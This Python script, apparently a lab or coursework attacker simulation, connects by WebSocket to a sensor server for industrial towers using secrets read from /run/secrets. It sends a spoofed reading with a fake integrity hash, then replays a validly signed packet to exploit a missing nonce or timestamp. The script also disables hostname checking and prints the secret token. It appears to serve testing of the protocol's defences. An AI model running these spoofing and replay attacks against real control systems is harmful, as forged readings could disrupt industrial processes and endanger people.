import asyncio
import json
import os
import ssl
import websockets
import hashlib
import hmac

async def attack():
    torre_ID = os.environ.get('TORRE_ID', '1')
    
    with open('/run/secrets/API-KEY', 'r') as f:
        api_key = f.read().strip()
    
    base_url = "wss://servidor:5050/ws" 
    URL = f"{base_url}/torre/{torre_ID}?api_key={api_key}"
    
    with open('/run/secrets/TOKEN-TORRE', 'r') as f:
        token = f.read()
    print("DEBUG ATTACKER TOKEN REPR:", repr(token))

    contexto_SSL = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    contexto_SSL.load_verify_locations('cert.pem')
    contexto_SSL.check_hostname = False

    print(f"[*] Conectando como atacante a {URL}...")
    try:
        async with websockets.connect(URL, ssl=contexto_SSL) as websocket:
            print("[+] Conectado exitosamente (API Key válida).")

            print("\n--- ATAQUE 1: Spoofing (Modificación en Tránsito con hash inválido) ---")
            payload_falso = {
                "nivel": 50.0,
                "flujo_pulpa": 20.0,
                "flujo_clo2": 5.0,
                "caudal_total": 25.0,
                "temperatura": 100.0, 
                "ph": 5.0,
                "presion": 100.0
            }
            # Agregamos un hash cualquiera
            payload_falso["hash_integridad"] = "falso_hash_1234567890abcdef"
            print("[*] Enviando payload modificado con hash falso...")
            await websocket.send(json.dumps(payload_falso))
            
            await asyncio.sleep(2)

            print("\n--- ATAQUE 2: Replay Attack (Ataque de Re-envío) ---")
            payload_valido = {
                "nivel": 50.0,
                "flujo_pulpa": 20.0,
                "flujo_clo2": 5.0,
                "caudal_total": 25.0,
                "temperatura": 80.0, 
                "ph": 7.0,
                "presion": 100.0
            }
            # Calculamos el hash válido
            string_payload = json.dumps(payload_valido, sort_keys=True)
            firma = hmac.new(token.encode(), string_payload.encode(), hashlib.sha256).hexdigest()
            payload_valido["hash_integridad"] = firma
            
            print("[*] Enviando payload original válido por primera vez...")
            await websocket.send(json.dumps(payload_valido))
            await asyncio.sleep(2)
            
            print("[*] Re-enviando el MISMO paquete interceptado (Replay Attack)...")
            await websocket.send(json.dumps(payload_valido))
            print("[+] ¡Paquete re-enviado! Como no hay Nonce o Timestamp en el hash, el servidor se lo 'tragará'.")
            
            await asyncio.sleep(2)

    except Exception as e:
        print(f"[-] Error en la conexión: {e}")

if __name__ == '__main__':
    asyncio.run(attack())
